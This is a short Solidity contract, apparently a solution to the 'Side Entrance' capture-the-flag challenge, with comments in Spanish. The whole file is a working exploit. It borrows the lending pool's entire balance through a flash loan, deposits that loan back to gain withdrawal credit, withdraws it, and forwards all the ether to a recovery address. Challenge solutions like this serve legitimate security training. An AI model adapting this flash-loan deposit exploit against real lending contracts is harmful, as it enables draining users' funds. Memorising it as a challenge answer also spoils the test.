// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceAttacker {
    SideEntranceLenderPool pool;
    address recovery;

    constructor (address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }

    function executeAttack() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance); // Llamamos al flash loan con todo el balance de la pool
        pool.withdraw();             // Hacemos withdraw ya que tenemos asignados todos los tokens de la pool
        (bool success, ) = recovery.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function execute() external payable {
        // Hacemos "deposit" de todos los fondos de la pool
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}